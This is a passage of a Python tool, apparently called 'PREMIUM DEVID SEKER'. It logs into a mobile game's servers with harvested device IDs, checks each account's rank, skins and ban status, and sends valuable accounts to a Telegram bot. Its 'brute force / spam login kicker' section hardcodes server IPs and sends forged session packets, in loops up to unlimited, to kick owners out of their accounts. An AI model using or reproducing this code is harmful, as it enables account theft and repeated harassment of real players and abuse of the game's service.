            f"🦸 Heroes    : {hero}  |  🎨 Skins : {skin}\n"
            f"🔐 V2L       : {'🟢' if v2l_text == 'ACTIVE' else '🔓'} {v2l_text}\n"
            f"📂 Saved to  : {FOLDERS.get('rank_' + rank_category, 'detail')}\n"
            f"═════════════════════════════════\n"
            f"✅ <b>ACCOUNT STATUS</b>: NOT BANNED\n"
            f"─────────────────────────\n"
            f"✨ <b>PREMIUM DEVID SEKER</b>\n"
            f"👑 <b>Created by:</b> @Markie678"
        )
        # ─── FIX: Use deduplication function ───
        threading.Thread(target=send_telegram_once, args=(device, tg_message,), daemon=True).start()
    
    with COUNTER_LOCK:
        if rank_category in HIT_COUNTERS:
            HIT_COUNTERS[rank_category] += 1
    
    rank_color = Fore.MAGENTA if rank_category == "mythic" else Fore.CYAN if rank_category == "legend" else Fore.GREEN
    print(f"\n{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
    print(f"Device ID    : {Fore.YELLOW}{device}{Style.RESET_ALL}")
    print(f"Account      : {Fore.YELLOW}{acc} ({zone}){Style.RESET_ALL}")
    print(f"Nickname     : {Fore.WHITE}{nick} (Lv.{level}){Style.RESET_ALL}")
    print(f"Rank         : {rank_color}{cur_rank}{Style.RESET_ALL}")
    print(f"V2L          : {Fore.GREEN if v2l_text == 'ACTIVE' else Fore.YELLOW}{v2l_text}{Style.RESET_ALL}")
    print(f"Saved to     : {Fore.CYAN}{FOLDERS.get('rank_' + rank_category, 'detail')}{Style.RESET_ALL}")
    if send_tg:
        print(f"Telegram     : {Fore.GREEN}SENT ✓{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'═'*60}{Style.RESET_ALL}\n")

# ────────────────────────────────────────────────────────────────
# 10. DETAIL CHECK ENGINE (8-REQ)
# ────────────────────────────────────────────────────────────────

def process_detail(device_id: str, account_id: int, zone_id: int) -> bool:
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_to_login_server():
                if 'ban' in conn.ban_status.lower():
                    save_account(
                        {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                        {'ban_status': conn.ban_status, 'nickname': 'BANNED'},
                        "detail"
                    )
                return False
            
            if not conn.get_game_server():
                return False
            
            if not conn.connect_to_game_server():
                return False
            
            skin_info = conn.get_skin_role_info(account_id, zone_id)
            ban_stat = conn.check_ban_status()
            
            if 'ban' in ban_stat.lower():
                save_account(
                    {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                    {'ban_status': ban_stat, 'nickname': 'BANNED'},
                    "detail"
                )
                return False
            
            v2l = get_v2l_status(conn, account_id, zone_id)
            result = conn.lookup_player(account_id)
            role_info = conn.get_role_info(account_id, zone_id)
            
            pd = {}
            if result and isinstance(result, dict):
                if isinstance(result.get(0), list) and len(result[0]) > 0 and isinstance(result[0][0], dict):
                    pd = result[0][0]
                elif isinstance(result.get(0), dict):
                    pd = result[0]
                else:
                    pd = result
            
            skin_info = skin_info if isinstance(skin_info, dict) else {}
            role_info = role_info if isinstance(role_info, dict) else {}
            
            nick = pd.get(2) or skin_info.get(2) or role_info.get(2) or f"Player_{account_id}"
            if nick.lower() in ("unknown", "guest", ""):
                return False
            
            level = pd.get(3) or skin_info.get(3) or role_info.get(3) or 1
            skin_cnt = skin_info.get(10) if skin_info and skin_info.get(10) is not None else pd.get(83, 0)
            hero_cnt = skin_info.get(9) if skin_info and skin_info.get(9) is not None else \
                       role_info.get(9) if role_info and role_info.get(9) is not None else 0
            cur_rank_val = pd.get(8) or skin_info.get(6, 0) or role_info.get(8, 0) or 0
            max_rank_val = pd.get(95) or skin_info.get(15, 0) or role_info.get(9, 0) or 0
            
            created_raw = pd.get(42) or conn.creation_ts
            created_at = ""
            if created_raw and isinstance(created_raw, (int, float)) and created_raw > 0:
                try:
                    dt = datetime.fromtimestamp(created_raw, tz=timezone.utc).astimezone(TZ_WIB)
                    created_at = dt.strftime("%Y-%m-%d %H:%M:%S WIB")
                except:
                    pass
            
            player_data = {
                'nickname': nick,
                'level': level,
                'skin_count': skin_cnt,
                'hero_count': hero_cnt,
                'current_rank': map_rank(cur_rank_val),
                'highest_rank': map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
                'ban_status': ban_stat,
                'v2l_status': v2l,
                'created_at': created_at,
                'last_online': 'N/A',
                'skin_breakdown': parse_skin_breakdown(skin_info.get(92, [])),
            }
            
            save_account(
                {'Device id': device_id, 'role_id': account_id, 'zone_id': zone_id},
                player_data,
                "detail"
            )
            return True
            
    except Exception as e:
        return False

# ────────────────────────────────────────────────────────────────
# 11. BULK CHECK
# ────────────────────────────────────────────────────────────────

def run_bulk_detail():
    print_header("🔥 PREMIUM BULK DETAIL CHECK (8-REQ)")
    print(f"{Fore.CYAN}This will check accounts and sort them into rank folders.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Accounts sent to Telegram ONLY if:{Style.RESET_ALL}")
    print(f"{Fore.GREEN}  • Legend or Mythic rank{Style.RESET_ALL}")
    print(f"{Fore.GREEN}  • OR 100+ skins{Style.RESET_ALL}")
    print(f"{Fore.GREEN}  • OR 50+ highest rank stars{Style.RESET_ALL}")
    print(f"{Fore.RED}  • Banned accounts are NEVER sent to Telegram{Style.RESET_ALL}\n")
    
    import glob
    txt_files = glob.glob(os.path.join(OUTPUT_DIR, "**", "*.txt"), recursive=True)
    
    for f in glob.glob("*.txt"):
        if f not in txt_files:
            txt_files.append(f)
    
    if not txt_files:
        print(f"{Fore.RED}No .txt files found!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Generate devices first (Option 1) or upload a combo file.{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return
    
    print(f"{Fore.CYAN}Select input file:{Style.RESET_ALL}")
    for i, f in enumerate(txt_files[:20], 1):
        rel = os.path.relpath(f, ".")
        print(f"  {Fore.YELLOW}[{i}]{Style.RESET_ALL} {rel}")
    
    print(f"  {Fore.YELLOW}[0]{Style.RESET_ALL} Back\n")
    
    choice = input(f"{Fore.CYAN}Choice (0-{len(txt_files)}): {Style.RESET_ALL}").strip()
    if choice == '0':
        return
    
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(txt_files):
            input_file = txt_files[idx]
        else:
            return
    except:
        return
    
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        devices = [l.strip() for l in f if l.strip()]
    
    if not devices:
        print(f"{Fore.RED}No device IDs found in file.{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.GREEN}Loaded {len(devices):,} devices{Style.RESET_ALL}")
    
    threads = input(f"{Fore.CYAN}Thread count (default 50): {Style.RESET_ALL}").strip()
    threads = int(threads) if threads.isdigit() else 100
    
    start_time = time.time()
    hits = 0
    processed = 0
    sent_to_tg = 0
    
    print(f"\n{Fore.CYAN}Starting check...{Style.RESET_ALL}")
    
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = []
        
        for dev in devices:
            acc, zone, stat = GameLogin(dev).run()
            if acc and zone:
                futures.append((dev, acc, zone, ex.submit(process_detail, dev, acc, zone)))
            elif 'ban' in stat.lower():
                save_account(
                    {'Device id': dev, 'role_id': '?', 'zone_id': '?'},
                    {'ban_status': stat, 'nickname': 'BANNED'},
                    "detail"
                )
                processed += 1
        
        total = len(futures)
        for dev, acc, zone, future in futures:
            if future.result():
                hits += 1
            processed += 1
            sys.stdout.write(f"\r{Fore.CYAN}Progress: {processed}/{len(devices)} | Valid: {processed} | Hits: {hits} | TG Sent: {sent_to_tg}{Style.RESET_ALL}")
            sys.stdout.flush()
    
    duration = time.time() - start_time
    print(f"\n\n{Fore.GREEN}✓ Done! Total hits: {hits}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Time: {duration:.1f}s | Speed: {len(devices)/duration:.1f}/s{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}Files saved to:{Style.RESET_ALL}")
    for folder in FOLDERS.values():
        path = os.path.join(OUTPUT_DIR, folder)
        if os.path.exists(path):
            count = len([f for f in os.listdir(path) if f.endswith('.txt')])
            if count > 0:
                print(f"  {Fore.GREEN}▶{Style.RESET_ALL} {folder}: {count} files")
    
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 12. BRUTE FORCE LOGIN / SPAM KICKER
# ────────────────────────────────────────────────────────────────

BACKUP_GATEWAYS = [
    (SERVER_HOST, SERVER_PORT),
    ('119.81.89.84', 30021),
    ('119.81.67.250', 30021),
    ('119.81.63.238', 30021),
    ('161.202.213.238', 30021)
]

def fetch_session_profile(device_id: str) -> Optional[Dict[str, Any]]:
    acc, zone, stat = GameLogin(device_id).run()
    if not acc or not zone:
        return None

    try:
        conn = GameConnection(device_id=device_id)
        if not conn.login_to_login_server():
            return None
        if not conn.get_game_server() or not conn.connect_to_game_server():
            return None
        
        sess_key = conn.session_key
        gs_host = conn.game_host
        gs_port = conn.game_port
        creation_ts = conn.creation_ts
        
        skin_info = conn.get_skin_role_info(acc, zone) if hasattr(conn, 'get_skin_role_info') else {}
        ban_stat = conn.check_ban_status() if hasattr(conn, 'check_ban_status') else "NORMAL"
        
        conn.cleanup()
        
        skin_info = skin_info if isinstance(skin_info, dict) else {}
        
        nick = skin_info.get(2) or f"Player_{acc}"
        level = skin_info.get(3) or 1
        skin_cnt = skin_info.get(10) if (skin_info and skin_info.get(10) is not None) else 0
        hero_cnt = skin_info.get(9) if (skin_info and skin_info.get(9) is not None) else 0
        cur_rank_val = skin_info.get(6, 0) or 0
        max_rank_val = skin_info.get(15, 0) or cur_rank_val
        
        return {
            'device_id': device_id,
            'account_id': acc,
            'session_key': sess_key,
            'zone_id': zone,
            'creation_ts': creation_ts,
            'game_host': gs_host,
            'game_port': gs_port,
            'gs_info': f"{gs_host}:{gs_port}",
            'nickname': nick,
            'level': level,
            'rank': map_rank(cur_rank_val),
            'highest_rank': map_rank(max_rank_val) if max_rank_val else map_rank(cur_rank_val),
            'skin_count': skin_cnt,
            'hero_count': hero_cnt,
            'ban_status': ban_stat,
        }
    except:
        return None

def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bool, float, str]:
    t0 = time.time()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile['game_host'], profile['game_port']))
        
        body_struct = SdpStruct({
            0: profile['account_id'],
            1: profile['session_key'],
            2: profile['zone_id'],
            4: CLIENT_VERSION,
            13: CHANNEL,
            15: profile['device_id']
        }).data
        
        pkt = SdpStruct({0: 10001, 1: 1, 5: body_struct}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.send(flags.to_bytes(4, 'big') + comp)
        
        q = b''
        got_ack = False
        while len(q) < 4:
            d = sock.recv(4096)
            if not d: break
            q += d
            
        if len(q) >= 4:
            fl = int.from_bytes(q[:4], 'big')
            sz = fl & 0xFFFFFF
            while len(q) < sz:
                d = sock.recv(4096)
                if not d: break
                q += d
            if len(q) >= sz:
                got_ack = True
                
        elapsed_ms = (time.time() - t0) * 1000
        sock.close()
        return True, elapsed_ms, ("ACK RECEIVED" if got_ack else "SENT OK")
    except socket.timeout:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, "TIMEOUT"
    except Exception as e:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try: sock.close()
            except: pass
        return False, elapsed_ms, str(e)

def print_profile_card(data: Dict[str, Any]):
    print(f"\n{Fore.CYAN}┌{'─'*60}┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Fore.GREEN}{'📋 ACCOUNT PROFILE (3-REQUEST VERIFICATION)'.center(60)}{Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}├{'─'*60}┤{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Fore.WHITE} 👤 Account ID    : {Fore.YELLOW}{str(data['account_id']):<17}{Fore.WHITE} Zone ID: {Fore.YELLOW}{str(data['zone_id']):<16}{Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Fore.WHITE} 🏷️  Nickname      : {Fore.GREEN}{str(data['nickname']):<21}{Fore.WHITE} Level  : {Fore.YELLOW}{str(data['level']):<13}{Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Fore.WHITE} 🏆 Current Rank  : {Fore.MAGENTA}{str(data['rank']):<41}{Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Fore.WHITE} 🌟 Highest Rank  : {Fore.YELLOW}{str(data['highest_rank']):<41}{Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Fore.WHITE} 🎨 Skin / Hero   : {Fore.YELLOW}{data['skin_count']} Skin{Fore.WHITE} | {Fore.YELLOW}{data['hero_count']} Hero{'':<24}{Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Fore.WHITE} 🌐 Game Server   : {Fore.CYAN}{str(data['gs_info']):<41}{Fore.CYAN}│{Style.RESET_ALL}")
    
    ban_color = Fore.RED if 'ban' in str(data['ban_status']).lower() else Fore.GREEN
    ban_display = str(data['ban_status']) if 'ban' in str(data['ban_status']).lower() else "NORMAL (Clean)"
    print(f"{Fore.CYAN}│{Fore.WHITE} ⚡ Account Status : {ban_color}{ban_display:<41}{Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└{'─'*60}┘{Style.RESET_ALL}\n")

def run_bruteforce_login():
    while True:
        print_header("⚡ BRUTE FORCE / SPAM LOGIN KICKER")
        print(f"{Fore.LIGHTBLACK_EX}Enter Device ID to verify and spam login kick.{Style.RESET_ALL}\n")

        target_device = input(f"{Fore.YELLOW}➡️ Enter Device ID Target (0 = Back): {Style.RESET_ALL}").strip()
        if not target_device or target_device in ('0', 'q', 'exit', 'back'):
            return

        print(f"\n{Fore.CYAN}[*] 🔍 Verifying Device ID & Account Target (3-Request Check)...{Style.RESET_ALL}")
        profile = fetch_session_profile(target_device)
        
        if not profile:
            print(f"\n{Fore.RED}❌ Invalid Device ID, dead, or login failed!{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            continue

        print_banner()
        print_profile_card(profile)

        print(f"{Fore.CYAN}┌{'─'*58}┐{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.YELLOW}{'⚙️ SPAM LOGIN / KICKER CONFIGURATION'.center(58)}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└{'─'*58}┘{Style.RESET_ALL}\n")
        print(f"{Fore.WHITE}Target Account : {Fore.GREEN}{profile['nickname']}{Fore.WHITE} (ID: {Fore.YELLOW}{profile['account_id']}{Fore.WHITE} | Zone: {Fore.YELLOW}{profile['zone_id']}{Fore.WHITE}){Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} 🧪 Single Test (One Kick) {Fore.GREEN}⚡ [Press Enter]{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} ⚡ 10x Login Kick (Standard)")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} 🚀 50x Login Kick (Fast)")
        print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} 💥 100x Login Kick (Aggressive)")
        print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} ♾️  Unlimited (Infinite until stopped)")
        print(f"{Fore.YELLOW}[6]{Style.RESET_ALL} 🛠️  Custom (Set your own loop count & delay)")
        print(f"{Fore.YELLOW}[0]{Style.RESET_ALL} 🔙 Back\n")
        
        mode_ch = input(f"{Fore.CYAN}Choose mode (0-6, Enter=1): {Style.RESET_ALL}").strip()
        if mode_ch == '0':
            continue

        if mode_ch in ('', '1'):
            print(f"\n{Fore.CYAN}[*] Sending Session Handshake to {profile['gs_info']}...{Style.RESET_ALL}")
            success, latency_ms, status_desc = send_session_kick(profile)
            
            if success:
                print(f"{Fore.GREEN}✅ [SUCCESS] Session connected & kicked other sessions!{Style.RESET_ALL}")
                print(f"    ├─ Status : {Fore.YELLOW}{status_desc}{Style.RESET_ALL}")
                print(f"    ├─ Latency: {Fore.YELLOW}{latency_ms:.1f} ms{Style.RESET_ALL}")
                print(f"    └─ Server : {Fore.CYAN}{profile['gs_info']}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ [FAILED] Session failed: {status_desc} ({latency_ms:.1f} ms){Style.RESET_ALL}")
                
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            continue

        total_loops = 10
        delay_sec = 2.0
        
        if mode_ch == '2':
            total_loops = 10
            delay_sec = 2.0
        elif mode_ch == '3':
            total_loops = 50
            delay_sec = 1.0
        elif mode_ch == '4':
            total_loops = 100
            delay_sec = 0.5
        elif mode_ch == '5':
            total_loops = 0
            delay_sec = 0.0
        elif mode_ch == '6':
            try:
                total_loops = int(input(f"{Fore.CYAN}Enter number of loops (0=unlimited, default=10): {Style.RESET_ALL}").strip() or "10")
                delay_sec = float(input(f"{Fore.CYAN}Enter delay in seconds (default=2.0): {Style.RESET_ALL}").strip() or "2.0")
            except:
                total_loops = 10
                delay_sec = 2.0

        tg_notify = False
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            tg_ask = input(f"\n{Fore.CYAN}Send session summary to Telegram? (y/n, default=y): {Style.RESET_ALL}").strip().lower()
            tg_notify = (tg_ask in ('', 'y', 'yes'))

        loop_label = f"{total_loops:,} Loops" if total_loops > 0 else "♾️ Unlimited"
        print(f"\n{Fore.CYAN}┌{'─'*58}┐{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.YELLOW}{f'⚡ SPAM LOGIN / KICKER ACTIVE ({loop_label} | Delay {delay_sec}s)'.center(58)}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.LIGHTBLACK_EX}{'Press Ctrl+C anytime to stop and see summary.'.center(58)}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└{'─'*58}┘{Style.RESET_ALL}\n")

        count = 0
        success_count = 0
        fail_count = 0
        latencies = []
        start_time = time.time()

        log_file = FILES["bruteforce_log"]
        with open(log_file, "a", encoding='utf-8') as log:
            log.write(f"\n{'═'*60}\n")
            log.write(f"BRUTE FORCE SESSION: {datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')}\n")
            log.write(f"Target: {profile['nickname']} (ID: {profile['account_id']}, Zone: {profile['zone_id']})\n")
            log.write(f"Total Loops: {loop_label} | Delay: {delay_sec}s\n")
            log.write(f"{'═'*60}\n")

        try:
            while True:
                count += 1
                ok, lat, desc = send_session_kick(profile)
                latencies.append(lat)
                cur_time = datetime.now(TZ_WIB).strftime('%H:%M:%S')

                loop_str = f"{count}/{total_loops}" if total_loops > 0 else f"{count}/∞"
                if ok:
                    success_count += 1
                    status_msg = f"{Fore.GREEN}🟢 [✓] Session Kicked!{Style.RESET_ALL}"
                else:
                    fail_count += 1
                    status_msg = f"{Fore.RED}🔴 [x] Kick Failed ({desc}){Style.RESET_ALL}"

                sys.stdout.write(f"\r[{cur_time}] {status_msg} | Loop {Fore.YELLOW}{loop_str}{Style.RESET_ALL} | Latency: {Fore.CYAN}{lat:.0f}ms{Style.RESET_ALL} | Success: {Fore.GREEN}{success_count}{Style.RESET_ALL} | Failed: {Fore.RED}{fail_count}{Style.RESET_ALL}  ")
                sys.stdout.flush()

                if count % 10 == 0:
                    with open(log_file, "a", encoding='utf-8') as log:
                        log.write(f"[{cur_time}] Loop {count}: Success={success_count}, Failed={fail_count}, Last Latency={lat:.0f}ms\n")

                if total_loops > 0 and count >= total_loops:
                    break
                    
                if delay_sec > 0:
                    time.sleep(delay_sec)
                    
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}⚠️ Session stopped by user (Ctrl+C).{Style.RESET_ALL}")

        duration = time.time() - start_time
        avg_lat = (sum(latencies) / len(latencies)) if latencies else 0.0
        succ_pct = (success_count / count * 100) if count > 0 else 0.0
        speed = (count / duration) if duration > 0 else 0.0

        print(f"\n\n{Fore.CYAN}┌{'─'*58}┐{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.GREEN}{'📊 SPAM LOGIN SUMMARY'.center(58)}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}├{'─'*58}┤{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.WHITE} 👤 Target Account : {Fore.YELLOW}{profile['nickname']} (ID: {profile['account_id']}){'':<18}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.WHITE} ⏱️  Duration       : {Fore.YELLOW}{duration/60:.1f} minutes ({duration:.1f}s){'':<20}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.WHITE} 🔄 Total Attempts : {Fore.CYAN}{count:,} Loops{'':<31}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.WHITE} ✅ Success Kicks  : {Fore.GREEN}{success_count:,} ({succ_pct:.1f}%){'':<27}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.WHITE} ❌ Failed Kicks   : {Fore.RED}{fail_count:,}{'':<36}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.WHITE} ⚡ Avg Latency    : {Fore.YELLOW}{avg_lat:.1f} ms | Speed: {speed:.2f} kick/s{'':<12}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}├{'─'*58}┤{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.LIGHTBLACK_EX} Log saved to: {FILES['bruteforce_log']:<32}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└{'─'*58}┘{Style.RESET_ALL}\n")

        with open(log_file, "a", encoding='utf-8') as log:
            log.write(f"\n{'─'*60}\n")
            log.write(f"SUMMARY:\n")
            log.write(f"  Duration: {duration/60:.1f} minutes\n")
            log.write(f"  Attempts: {count:,}\n")
            log.write(f"  Success: {success_count:,} ({succ_pct:.1f}%)\n")
            log.write(f"  Failed: {fail_count:,}\n")
            log.write(f"  Avg Latency: {avg_lat:.1f}ms\n")
            log.write(f"  Speed: {speed:.2f} kick/s\n")
            log.write(f"{'─'*60}\n")

        if tg_notify:
            tg_msg = (
                f"⚡ <b>SPAM LOGIN SUMMARY</b>\n"
                f"────────────────────────\n"
                f"👤 <b>Account</b> : {profile['nickname']} (ID: <code>{profile['account_id']}</code>)\n"
                f"⏱️ <b>Duration</b> : {duration/60:.1f} minutes\n"
                f"🔄 <b>Total Loops</b> : {count:,}\n"
                f"✅ <b>Success Kicks</b> : {success_count:,} ({succ_pct:.1f}%)\n"
                f"❌ <b>Failed</b> : {fail_count:,}\n"
                f"⚡ <b>Avg Latency</b> : {avg_lat:.1f} ms\n"
                f"────────────────────────\n"
                f"✨ <b>PREMIUM DEVID SEKER</b>\n"
                f"👑 <b>Created by:</b> @Markie678"
            )
            send_telegram(tg_msg)

        input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 13. SINGLE CHECK
# ────────────────────────────────────────────────────────────────

def run_single_check():
    print_header("🔍 SINGLE ACCOUNT CHECK (8-REQ FULL DETAIL)")
    print(f"{Fore.CYAN}This will check ONE account with full detail including ban status.{Style.RESET_ALL}\n")
    
    device_id = input(f"{Fore.YELLOW}➡️ Enter Device ID: {Style.RESET_ALL}").strip()
    if not device_id:
        return
    
    print(f"\n{Fore.CYAN}[*] Checking account...{Style.RESET_ALL}")
    
    # First, get account ID and zone
    acc, zone, stat = GameLogin(device_id).run()
    if not acc or not zone:
        print(f"\n{Fore.RED}❌ Login failed! Device ID invalid or dead.{Style.RESET_ALL}")
        if 'ban' in stat.lower():
            print(f"{Fore.RED}   Status: {stat}{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}✓ Login successful! Account ID: {acc}, Zone: {zone}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Fetching full details (8-requests)...{Style.RESET_ALL}")
    
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_to_login_server():
                print(f"{Fore.RED}❌ Failed to connect to login server.{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
                return
            
            if not conn.get_game_server():
                print(f"{Fore.RED}❌ Failed to get game server.{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
                return
            
            if not conn.connect_to_game_server():
                print(f"{Fore.RED}❌ Failed to connect to game server.{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
                return
            
            skin_info = conn.get_skin_role_info(acc, zone)
            ban_stat = conn.check_ban_status()
            
            # Check if banned
            is_banned = 'ban' in ban_stat.lower()
            
            v2l = get_v2l_status(conn, acc, zone)
            result = conn.lookup_player(acc)
            role_info = conn.get_role_info(acc, zone)
            
            pd = {}
            if result and isinstance(result, dict):
                if isinstance(result.get(0), list) and len(result[0]) > 0 and isinstance(result[0][0], dict):
                    pd = result[0][0]
                elif isinstance(result.get(0), dict):
                    pd = result[0]
                else:
                    pd = result
            
            skin_info = skin_info if isinstance(skin_info, dict) else {}
            role_info = role_info if isinstance(role_info, dict) else {}
            
            nick = pd.get(2) or skin_info.get(2) or role_info.get(2) or f"Player_{acc}"
            level = pd.get(3) or skin_info.get(3) or role_info.get(3) or 1
            skin_cnt = skin_info.get(10) if skin_info and skin_info.get(10) is not None else pd.get(83, 0)
            hero_cnt = skin_info.get(9) if skin_info and skin_info.get(9) is not None else \
                       role_info.get(9) if role_info and role_info.get(9) is not None else 0
            cur_rank_val = pd.get(8) or skin_info.get(6, 0) or role_info.get(8, 0) or 0
            max_rank_val = pd.get(95) or skin_info.get(15, 0) or role_info.get(9, 0) or 0
            
            created_raw = pd.get(42) or conn.creation_ts
            created_at = ""
            if created_raw and isinstance(created_raw, (int, float)) and created_raw > 0:
                try:
                    dt = datetime.fromtimestamp(created_raw, tz=timezone.utc).astimezone(TZ_WIB)
                    created_at = dt.strftime("%Y-%m-%d %H:%M:%S WIB")
                except:
                    pass
            
            v2l_text = "ACTIVE" if str(v2l).lower() in ('enabled', 'yes', '1', 'true') else \
                        "INACTIVE" if str(v2l).lower() in ('disabled', 'no', '0', 'false') else "N/A"
            
            cur_rank = map_rank(cur_rank_val)
            highest_rank = map_rank(max_rank_val) if max_rank_val else cur_rank
            
            # Print results
            print(f"\n{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}📋 ACCOUNT DETAILS (8-REQUEST FULL CHECK){Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
            print(f"📱 Device ID    : {Fore.YELLOW}{device_id}{Style.RESET_ALL}")
            print(f"🆔 Account      : {Fore.YELLOW}{acc} ({zone}){Style.RESET_ALL}")
            print(f"👤 Nickname     : {Fore.GREEN}{nick} (Lv.{level}){Style.RESET_ALL}")
            
            ban_color = Fore.RED if is_banned else Fore.GREEN
            ban_text = "BANNED" if is_banned else "NORMAL (Clean)"
            print(f"⚡ Account Status: {ban_color}{ban_text}{Style.RESET_ALL}")
            
            if is_banned:
                print(f"   {Fore.RED}Ban Reason: {ban_stat}{Style.RESET_ALL}")
            
            rank_color = Fore.MAGENTA if "mythic" in cur_rank.lower() else Fore.CYAN if "legend" in cur_rank.lower() else Fore.WHITE
            print(f"🏆 Rank         : {rank_color}{cur_rank}{Style.RESET_ALL}")
            print(f"⭐ Max Rank     : {Fore.YELLOW}{highest_rank}{Style.RESET_ALL}")
            print(f"🦸 Heroes       : {Fore.CYAN}{hero_cnt}{Style.RESET_ALL}")
            print(f"🎨 Skins        : {Fore.CYAN}{skin_cnt}{Style.RESET_ALL}")
            print(f"🔐 V2L Status   : {Fore.GREEN if v2l_text == 'ACTIVE' else Fore.YELLOW}{v2l_text}{Style.RESET_ALL}")
            print(f"📅 Created      : {Fore.CYAN}{created_at}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'═'*60}{Style.RESET_ALL}\n")
            
            # Send to Telegram if good (not banned and meets criteria)
            rank_category = get_rank_category(cur_rank)
            should_tg = should_send_to_telegram(rank_category, skin_cnt, highest_rank)
            
            if should_tg and not is_banned:
                # ─── FIX: Removed direct send_telegram call ───
                # Only save_account will handle the Telegram send
                print(f"{Fore.GREEN}✓ Account qualifies — will be sent to Telegram via save function{Style.RESET_ALL}")
            elif is_banned:
                print(f"{Fore.RED}✗ Account is BANNED — Not sent to Telegram{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}✗ Account does not meet Telegram criteria{Style.RESET_ALL}")
            
            # Save to files (this will also handle Telegram send once)
            player_data = {
                'nickname': nick,
                'level': level,
                'skin_count': skin_cnt,
                'hero_count': hero_cnt,
                'current_rank': cur_rank,
                'highest_rank': highest_rank,
                'ban_status': ban_stat,
                'v2l_status': v2l,
                'created_at': created_at,
                'last_online': 'N/A',
            }
            save_account(
                {'Device id': device_id, 'role_id': acc, 'zone_id': zone},
                player_data,
                "detail"
            )
            
    except Exception as e:
        print(f"{Fore.RED}❌ Error: {e}{Style.RESET_ALL}")
    
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 14. MENU
# ────────────────────────────────────────────────────────────────

